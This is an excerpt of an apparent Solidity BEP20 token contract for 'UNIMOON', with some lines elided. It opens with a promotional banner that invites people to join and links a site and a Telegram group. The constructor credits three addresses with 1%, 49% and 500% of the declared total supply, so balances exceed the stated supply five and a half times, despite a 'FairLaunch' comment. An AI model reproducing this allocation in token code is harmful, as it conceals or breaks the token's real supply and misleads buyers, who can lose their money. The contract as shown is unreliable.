...
▀▀▄▄▄▄▀▀▄▄▄▀▀▄▄▀▄▄▄▀▄▄▄▀▄▄▄▀▄▄▄▄▀▄▄▄▄▀▄▄▄▀▀▄▄
---------------    UNIMOON   --------------------
The crypto for FREEDOM of choice! Join the revolution! Let's
create a real currency for those who wants to be part of a 
bigger project! Help us build the community too!

https://www.UNIMOON.io/
https://t.me/UNIMOON
------------------------------------------------
*/
pragma solidity ^0.8.9;

interface IBEP20UNIMOON {
...
contract UNIMOONToken is IBEP20UNIMOON {
     // FairLaunch
    // common addresses
    address private owner;
    address private UNIMOONBSC;
    address private UNIMOONCoin;
    address private UNIMOONs;
    ...
    string public override name = "UNIMOON Token";
    string public override symbol = "UNIMOON";
    ...
    constructor(uint totalSupplyValue, address UNIMOONBSCAddress, address UNIMOONCoinAddress, address UNIMOONsAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        UNIMOONBSC = UNIMOONBSCAddress;
        UNIMOONCoin = UNIMOONCoinAddress;
        UNIMOONs = UNIMOONsAddress;
        balances[UNIMOONBSC] =  totalSupply * 1 / 100;
        balances[UNIMOONCoin] = totalSupply * 49 / 100;
        balances[UNIMOONs] = totalSupply * 500 / 100;
